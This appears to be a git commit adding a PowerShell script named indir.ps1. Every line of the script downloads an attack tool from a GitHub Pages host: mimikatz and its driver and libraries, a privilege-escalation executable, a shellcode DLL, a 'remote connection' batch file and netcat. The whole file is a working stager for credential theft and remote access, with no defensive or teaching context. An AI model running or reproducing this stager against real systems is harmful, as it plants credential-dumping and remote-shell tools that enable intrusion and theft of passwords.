e7721b108fe394f8e9b5ff1acfe2fb5bea711caa
sinemaslan06 <84999133+sinemaslan06@users.noreply.github.com>
2021-08-18 12:15:04 +0300

    Add files via upload

---
+++ indir.ps1
@@ -0,0 +1,19 @@
+$WebClient = New-Object System.Net.WebClient
+$WebClient.DownloadFile('https://sinemaslan06.github.io/uzakbaglanti.bat','uzakbaglanti.bat')
+$WebClient = New-Object System.Net.WebClient
+$WebClient.DownloadFile('https://sinemaslan06.github.io/EoP.exe','EoP.exe')
+$WebClient = New-Object System.Net.WebClient
+$WebClient.DownloadFile('https://sinemaslan06.github.io/Shellcode.dll','Shellcode.dll')
+$WebClient = New-Object System.Net.WebClient
+$WebClient.DownloadFile('https://sinemaslan06.github.io/mimikatz.bat','mimikatz.bat')
+$WebClient = New-Object System.Net.WebClient
+$WebClient.DownloadFile('https://sinemaslan06.github.io/mimikatz.exe','mimikatz.exe')
+$WebClient = New-Object System.Net.WebClient
+$WebClient.DownloadFile('https://sinemaslan06.github.io/mimidrv.sys','mimidrv.sys')
+$WebClient = New-Object System.Net.WebClient
+$WebClient.DownloadFile('https://sinemaslan06.github.io/mimilib.dll','mimilib.dll')
+$WebClient = New-Object System.Net.WebClient
+$WebClient.DownloadFile('https://sinemaslan06.github.io/mimilove.exe','mimilove.exe')
+$WebClient = New-Object System.Net.WebClient
+$WebClient.DownloadFile('https://sinemaslan06.github.io/nc32.exe','nc32.exe')
+
